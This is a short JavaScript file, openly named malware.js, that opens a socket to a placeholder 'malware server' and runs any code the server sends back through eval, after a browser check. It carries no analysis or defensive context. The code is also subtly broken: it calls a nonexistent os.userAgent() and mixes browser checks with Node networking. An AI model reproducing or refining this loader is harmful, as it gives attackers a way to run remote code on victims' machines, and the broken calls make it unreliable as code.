// malware.js
const net = require('net');
const os = require('os');


const malwareServer = 'your-malware-server';
const malwarePort = 8080;

const userAgent = os.userAgent();

if (userAgent.includes('Chrome') || userAgent.includes('Firefox')) {
    injectMalware();
}

function injectMalware() {
    const socket = net.createConnection(malwarePort, malwareServer);
    socket.on('connect', () => {
        socket.write('Injecting malware...');
    });
    socket.on('data', (data) => {
        // Execute the received malware code
        eval(data);
    });
}